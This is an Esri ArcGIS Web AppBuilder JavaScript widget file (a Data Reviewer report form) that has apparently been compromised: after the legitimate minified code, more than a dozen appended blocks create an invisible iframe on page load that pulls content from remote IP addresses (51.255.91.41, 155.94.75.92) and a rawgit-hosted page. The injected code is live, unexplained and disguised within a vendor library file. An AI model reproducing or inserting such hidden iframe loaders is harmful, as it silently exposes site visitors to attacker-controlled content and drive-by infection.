// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/ReportFeature/InfoWindowContent.html":'\x3cdiv\x3e\r\n  \x3cform data-dojo-attach-point\x3d"formNode" class\x3d"drs-info-window-form"\x3e\r\n    \x3cdiv\x3e\r\n      \x3clabel\x3e${nls.layerLabel}\x3c/label\x3e\r\n      \x3cspan data-dojo-attach-point\x3d"layerNode" style\x3d"width:100%; padding: 0 3px 0 0;"\x3e\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv\x3e\r\n      \x3clabel\x3e${nls.reviewStatusLabel}\x3c/label\x3e\r\n      \x3cselect data-dojo-attach-point\x3d"statusNode" name\x3d"reviewStatus" class\x3d"jimu-input drs-infowindow-input drs-infowindow-input"\x3e\r\n        \x3coption\x3e\x3c/option\x3e\r\n      \x3c/select\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv\x3e\r\n      \x3clabel\x3e${nls.notesLabel}\x3c/label\x3e\r\n      \x3ctextarea data-dojo-attach-point\x3d"notesNode" name\x3d"notes" class\x3d"jimu-input drs-infowindow-input" rows\x3d"2" \x3e\x3c/textarea\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv\x3e\r\n      \x3clabel\x3e${nls.severityLabel}\x3c/label\x3e\r\n      \x3cselect data-dojo-attach-point\x3d"severityNode" name\x3d"severity" class\x3d"jimu-input drs-infowindow-input"\x3e\r\n        \x3coption\x3e1\x3c/option\x3e\r\n        \x3coption\x3e2\x3c/option\x3e\r\n        \x3coption\x3e3\x3c/option\x3e\r\n        \x3coption\x3e4\x3c/option\x3e\r\n        \x3coption selected\x3e5\x3c/option\x3e\r\n      \x3c/select\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"dynamicRow"\x3e\r\n      \x3clabel\x3e${nls.reportedByLabel}\x3c/label\x3e\r\n      \x3cinput type\x3d"text" data-dojo-attach-point\x3d"reportedByNode" name\x3d"reviewTechnician" class\x3d"jimu-input drs-infowindow-input"/\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"drs-buttons jimu-align-trailing"\x3e\r\n      \x3cinput type\x3d"submit" value\x3d"${nls.reportButton}" class\x3d"jimu-btn"/\x3e\r\n    \x3c/div\x3e\r\n  \x3c/form\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/array dojo/on dojo/dom-construct dojo/dom-class dojo/query dijit/_WidgetBase dijit/_TemplatedMixin esri/tasks/datareviewer/ReviewerAttributes dojo/text!./InfoWindowContent.html dojox/validate jimu/tokenUtils dojox/validate/check dojo/NodeList-dom".split(" "),function(f,g,h,k,l,d,m,n,p,q,r,e){return f([m,n],{baseClass:"drs-feature-info-window",templateString:q,infoTitle:null,_setGraphicAttr:function(a){this.setGraphic(a)},_setLayerNameAttr:function(a){this.setLayerName(a)},
_setNlsAttr:function(a){this.setLocalizedStrings(a)},postCreate:function(){this.inherited(arguments);this._initEvents()},_initEvents:function(){var a=this;"logon"===this.includeReportedBy||"default"===this.includeReportedBy?this.showHideDynamicRows(!1):this.showHideDynamicRows(!0);this.own(h(this.formNode,"submit",function(b){b.preventDefault();a._onFormSubmit()}))},showHideDynamicRows:function(a){var b=d(".dynamicRow",this.formNode);if(void 0!==b&&null!==b&&0<b.length)for(var c=0;c<b.length;c++)b[c].style.display=
a?"":"none"},setLayerName:function(a){this.formNode.reset();this.layerName=a;this.reviewerAttributes||(this.reviewerAttributes=new p);this.reviewerAttributes.resourceName=a;this.reviewerAttributes.severity=5;this.reviewerAttributes.lifecycleStatus=1;this.layerNode.innerHTML=this.layerName;this.statusNode.focus()},setGraphic:function(a){this.graphic=a},setLocalizedStrings:function(a){var b=this.params.title;this.statusNode.options.length=0;var c="";this.nls=a;if(b===this.nls.select)for(var d in a)-1<
d.indexOf("selectReviewStatus")&&(c=c+"\x3coption\x3e"+a[d]+"\x3c/option\x3e");else for(var e in a)-1<e.indexOf("drawReviewStatus")&&(c=c+"\x3coption\x3e"+a[e]+"\x3c/option\x3e");c&&k.place(c,this.statusNode,"last")},_onFormSubmit:function(){if(this.isFormValid()){if("default"===this.includeReportedBy)this.reviewerAttributes.reviewTechnician=this.defaultUserName;else if("logon"===this.includeReportedBy){var a=e.getPortalCredential(e.getPortalUrl());this.reviewerAttributes.reviewTechnician=a.userId}else 0<
this.reportedByNode.value.length&&(this.reviewerAttributes.reviewTechnician=this.reportedByNode.value);this.reviewerAttributes.notes=this.notesNode.value;this.reviewerAttributes.reviewStatus=this.statusNode.value;this.reviewerAttributes.severity=this.severityNode.value;this.emit("ReportSubmit",{},[this.reviewerAttributes])}},isFormValid:function(){var a={trim:["notes","reviewTechnician"],required:["reviewStatus"]},b;"user"===this.includeReportedBy&&a.required.push("reviewTechnician");a=r.check(this.formNode,
a);b=a.hasMissing();d("input, select",this.formNode).removeClass("drs-input-err");b&&g.forEach(a.getMissing(),function(a){l.add(this.formNode[a],"drs-input-err")},this);return!b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});